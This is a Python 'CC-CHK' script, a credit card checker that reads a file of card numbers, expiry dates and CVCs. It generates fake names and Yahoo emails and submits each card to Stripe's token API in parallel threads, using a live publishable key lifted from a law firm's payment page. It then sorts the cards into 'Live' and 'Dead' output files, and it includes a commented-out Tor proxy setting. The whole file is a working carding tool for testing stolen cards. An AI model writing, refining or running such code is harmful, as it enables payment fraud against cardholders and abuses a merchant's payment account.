import requests , re , random , datetime , os , threading , sys

if sys.platform in ["linux","linux2"]:
	W = '\033[0m'
	G = '\033[32;1m'
	R = '\033[31;1m'
	
else:
	W = ''
	G = ''
	R = ''

def randomname():
	global FNaMe
	global LNaMe
	ListNames = []

	with open('listnames.txt' , 'r') as listfile:
		x = listfile.read()
		lista = x.split('\n')
		for i in lista:

			lista2 = i.split(' ')
			for i in lista2:
				if len(i) > 3:
					ListNames.append(i)
				else:
					continue
	random.shuffle(ListNames) 
		
	FNaMe = random.sample(ListNames , 1)
	LNaMe = random.sample(ListNames , 1)
	NameMail = FNaMe[0] + LNaMe[0] +  str(random.randint(30,3000))	
	

	return NameMail


NameMail = randomname()
session = requests.session()
#session.proxies = {'https':'socks5://127.0.0.1:9050'}

def packet1(cc,cvc,month,year):

	header =  {
	'Host': 'api.stripe.com',
	'Connection': 'close',
	# Content-Length: 576
	'Accept': 'application/json',
	'Origin': 'https://js.stripe.com',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Referer': 'https://js.stripe.com/v3/controller-b7d81dedeec3c3d419eaeb8fd94a299b.html',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8'

	}

	payload = 'email={0}@yahoo.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F4bb95a3)&referrer=https%3A%2F%2Fdyanwilliamslaw.com%2Fpay-online-by-credit-card-or-debit-card%2F&pasted_fields=cvc%2Cnumber&card[number]={1}&card[exp_month]={2}&card[exp_year]={3}&card[cvc]={4}&card[name]={5}&time_on_page=55720&guid=a1a725ea-bb1e-4c31-8556-9454a64e28a6&muid=a9064355-971b-456b-b1cc-5aee83733af8&sid=8e5b9040-9906-424d-b989-34bca32d62a5&key=pk_live_srTdi5OfErTSw5BGXqEkY9C1'.format(NameMail , cc , month , year , cvc , NameMail)
	# print(payload)
	res = session.post('https://api.stripe.com/v1/tokens', data=payload, headers=header)

	return res.text
	# print(res.text)


	# print(token , card_id , IP)




# print(token)



# print(email)
print()

print(G + r'''
  ______   ______          ______  __    __   __  ___ 
 /      | /      |        /      ||  |  |  | |  |/  / 
|  ,----'|  ,----' ______|  ,----'|  |__|  | |  '  /  
|  |     |  |     |______|  |     |   __   | |    <   
|  `----.|  `----.       |  `----.|  |  |  | |  .  \  
 \______| \______|        \______||__|  |__| |__|\__\ 
                                                      
''')

print()
print(R + '[X] WRITE THE NAME OF FILE CONTAINING CREDIT CARDS ... ')

print(G + '[X] NAME :>> ' , end='')

inputt = input()

file = open(inputt)

readf = file.read()

lista = readf.split('\n')

cc = []
cvc = []
month = []
year = []


patterncc = re.compile(r'(\d{16})\|')
patterncvc = re.compile(r'\|(\d{3})$')
patternmonth = re.compile(r'\|(\d{2})\|')
patternyaer = re.compile(r'\|\d{2}(\d{2})\|')


for i in lista:
	if i.isspace() or '|' not in i :
		continue
	try:

		searchcc = patterncc.search(i)
		cc.append(searchcc.group(1))
		searchcvc = patterncvc.search(i)
		cvc.append(searchcvc.group(1))
		searchmonth = patternmonth.search(i)
		month.append(searchmonth.group(1))
		searchyear = patternyaer.search(i)
		if searchyear:
			
			year.append(searchyear.group(1))
		elif not searchyear:
			patternyaer = re.compile(r'\|(\d{2})')

			searchyear = patternyaer.findall(i)
			# print(searchyear)
			year.append(searchyear[1])
	except:
		print('[X] AMEX NOT SUPPORTED')
		continue
# print(cc)
# print(cvc)
# print(month)
# print(year)

Live = []
Dead = []
x = 1

def process(i):

	

	email = randomname() + '@yahoo.com'




	response = packet1(cc[i] , cvc[i] , month[i] , year[i])
	# print(response)
	patternres = re.compile(r'"message":"(.+?)"')

	searchres = patternres.search(response)

	if searchres:
		mess = searchres.group(1)

	stra = cc[i]+ '|' +month[i]+ '|'+ year[i]+ '|'+ cvc[i]
	# print(response)
	if '"message":' in response or '"type":"forbidden","message"' in response:
		print(R + '[!] [%s/%s] CHECKING : '%( i +1 , len(cc)) , cc[i] ,  month[i], year[i] , cvc[i] ,' ... ' , end='' , flush=True)
		print(R + '[x] DIE' , response[response.find('age":')+6: response.find('.",')])
		Dead.append(stra)
	else:
		print(G + '[!] [%s/%s] CHECKING : '%( i +1 , len(cc)) ,  cc[i] ,  month[i], year[i] , cvc[i] ,' ... ' , end='' , flush=True)
		print(G + '[$] LIVE')
		Live.append(stra)
	# print('\n')

threads = []
for i in range(len(cc)):

	thread = threading.Thread(target=process , args=[i])
	threads.append(thread)
	thread.start()
	# print('\n')

	#if x == 20:
	#	new_ip()


	
	x +=1


for i in threads:
	i.join()
Name = str(datetime.datetime.now())

os.makedirs('OUTPUT' , exist_ok=True)

os.chdir('OUTPUT')

os.makedirs(Name)
os.chdir(Name)

with open('Live.txt' , 'w') as file:
	for i in Live:
		file.write(i + '\n')

with open('Dead.txt' , 'w') as file:
	for i in Dead:
		file.write(i+'\n') 

print(G + '[X] THE RESULTS HAVE BEEN SAVED IN [ %s ]' % (Name))
